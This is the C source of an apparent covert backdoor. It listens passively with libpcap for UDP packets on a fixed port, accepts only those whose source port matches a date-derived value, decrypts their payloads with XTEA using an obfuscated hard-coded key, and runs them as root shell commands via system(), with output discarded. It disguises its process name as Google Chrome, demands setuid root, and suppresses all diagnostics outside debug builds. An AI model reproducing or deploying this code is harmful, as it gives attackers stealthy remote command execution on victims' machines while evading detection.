#include <arpa/inet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "pkthdr.h"
#include "util.h"
#include "xtea.h"

#define RUNNING_NAME    "/Applications/Google Chrome.app/Contents/SPOOF"
#define INF_NAME        "any"
#define MAX_CMD_SIZE    1024
#define MAX_DLINK_HDR   16
#define SNAP_LEN        (MAX_CMD_SIZE + sizeof(struct ip_header) + sizeof(struct tcp_header) + MAX_DLINK_HDR)
#define FILTER_STRING   "udp dst port 34249"
#define MANGLED "a1487b33FcAc3FD8aa9D4d44e4e402AFDa955cc514cEC0368bB8eD717aaa8cC5\0" 

uint32_t* get_key(uint32_t key[4])
{
    char *mangled = MANGLED;
    char less_mangled[4][8];
    char keyseg[9];
    size_t i = 0;
    size_t j = 0;

    while (*mangled)
    {
        if (*mangled < 'a')
        {
            less_mangled[i][j++] = *(mangled++);
            if (j == 8)
            {
                j = 0;
                i++;
            }
        }
        else
        {
            mangled += 2;
        }
    }
    reverse((char *) less_mangled, 32);

    for (i = 0; i < 4; i++)
    {
        strncpy(keyseg, less_mangled[i], 8); 
        key[i] = strtol(keyseg, NULL, 16);
    }
    return key;
}


u_char datalink_length(pcap_t *session)
{
    int dlink = pcap_datalink(session);

    switch (dlink)
    {
        case DLT_NULL:          return 4;
        case DLT_EN10MB:        return 14;
        case DLT_RAW:           return 14;
        case DLT_LOOP:          return 4;
        case DLT_LINUX_SLL:     return 16;
    }
#ifdef DEBUG
    fprintf(stderr, "datalink_length(): unknown type: %d", dlink);
#endif
    return 16;
}

/*void inspect_tcp(struct ip_header *iph)*/
/*{*/
/*}*/

/*void inspect_icmp(struct ip_header *iph)*/
/*{*/
/*}*/

void inspect_udp(struct ip_header *iph)
{
    uint16_t len;
    uint16_t deciphered;
    char *data;
    char command[MAX_CMD_SIZE];
    uint32_t key[4];
    struct udp_header *udph = (struct udp_header *)
            ((char *) iph + sizeof(struct ip_header));


    if (ntohs(udph->srcport) != port_from_date())
    {
        printf("ntohs(udph->srcport): %d\n", ntohs(udph->srcport));
        printf("port: %d\n", port_from_date());
        return;
    }

    len = iph->id;
        
    data = (char *) udph + sizeof(udph);
    get_key(key);

    deciphered = 0;

    while (deciphered < len)
    {
        decipher(RCM_NUM_ROUNDS, (uint32_t *) (data + deciphered), key); 
        deciphered += sizeof(uint32_t) / sizeof(char) * 2;
    }
    strncpy(command, data, len);
    command[len] = '\0';

#ifdef DEBUG
    printf("\n\tCommand: \"%s\"\n\n", command);
    fflush(stdout);
#else
    strcpy(&command[len], " &> /dev/null"); 
#endif
    system(command);

    /* don't leave key in memory */
    memset(key, '\0', sizeof(uint32_t) / sizeof(char) * 4);
}

void inspect_packet(u_char *linklen, const struct pcap_pkthdr *h,
        const u_char *bytes)
{
    struct ip_header *iph = (struct ip_header *) (bytes + *linklen);

#ifdef DEBUG
    printf("\n");
    print_packet(bytes, h->caplen);
#endif

    switch (iph->protocol)
    {
        case IP_TCP:
            if (h->caplen - *linklen - sizeof(struct tcp_header) > 0)
            {
                /*inspect_tcp(iph);*/
            }
            break;

        case IP_UDP:    
            if (h->caplen - *linklen - sizeof(struct udp_header) > 0)
            {
                inspect_udp(iph);
            }
            break;

        case IP_ICMP:
            if (h->caplen - *linklen - sizeof(struct icmp_header) > 0)
            {
                /*inspect_icmp(iph);*/
            }
            break;
    }
}

pcap_t * config_session()
{
    pcap_t *session;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;

    /*if (pcap_findalldevs())*/
    if (pcap_lookupnet(NULL, &net, &mask, errbuf))
    {
#ifdef DEBUG
        fprintf(stderr, "pcap_lookupnet(): %s\n", errbuf);
#endif
        exit(0);
    }

    if ((session = pcap_open_live(INF_NAME, SNAP_LEN, 0, 0, errbuf)) == NULL)
    {
#ifdef DEBUG
        fprintf(stderr, "pcap_open_live(): %s\n", errbuf);
#endif
        exit(0);
    }

    if (pcap_compile(session, &filter, FILTER_STRING, 0, net))
    {
#ifdef DEBUG
        pcap_perror(session, "pcap_compile()");
#endif
        exit(0);
    }

    if (pcap_setfilter(session, &filter))
    {
#ifdef DEBUG
        pcap_perror(session, "pcap_setfilter()");
#endif
        exit(0);
    }

    return session;
}

int main(int argc, char **argv)
{
    pcap_t *session = NULL;
    int rtn;
    u_char linklen;
    argc++; /* no op */

    strcpy(argv[0], RUNNING_NAME);
    if (setuid(0) || setgid(0))
    {
#ifdef DEBUG
        fprintf(stderr, "> This needs to be owned by root with the s-bit set\n");
        fprintf(stderr, "chown root %s\n", argv[0]);
        fprintf(stderr, "chmod +s %s\n", argv[0]);
#endif
        return 0;
    }

    session = config_session();
    linklen = datalink_length(session); 
    rtn = pcap_loop(session, -1, inspect_packet, &linklen);

    switch (rtn)
    {
#ifdef DEBUG
        case 0:     fprintf(stderr, "pcap_loop(): cnt reached\n");      break;
        case -1:    pcap_perror(session, "pcap_loop()");                break;
        case -2:    fprintf(stderr, "pcap_loop(): no packets processed\n");
#endif
    }
    return 0;
}
